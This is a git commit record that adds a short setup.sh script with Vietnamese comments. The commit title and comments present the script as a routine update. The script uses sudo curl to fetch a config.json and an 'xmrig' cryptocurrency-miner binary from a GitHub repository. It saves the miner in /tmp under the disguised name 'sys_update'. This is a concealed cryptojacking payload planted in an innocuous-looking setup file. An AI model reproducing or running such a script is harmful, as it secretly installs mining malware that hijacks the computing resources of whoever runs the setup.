72c4d0505a9945f73424f17c9cbb9732d287cd67
AnnaliseHackett <fdsjkrnennnnnnnnnnnnnnnnugierhguierhngiengioejgfmeofe@tempmail.ckvn.edu.vn>
2026-01-25 10:33:30 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,1 +1,15 @@
-123
+# Di chuyển vào thư mục tạm (nơi Service sẽ đọc file)
+
+cd /tmp
+
+
+
+# Tải lại file config với quyền sudo và lọc bỏ ký tự lạ
+
+sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' | sudo tee /tmp/config.json > /dev/null
+
+
+
+# Đảm bảo file thực thi sys_update cũng nằm ở đây
+
+sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /tmp/sys_update
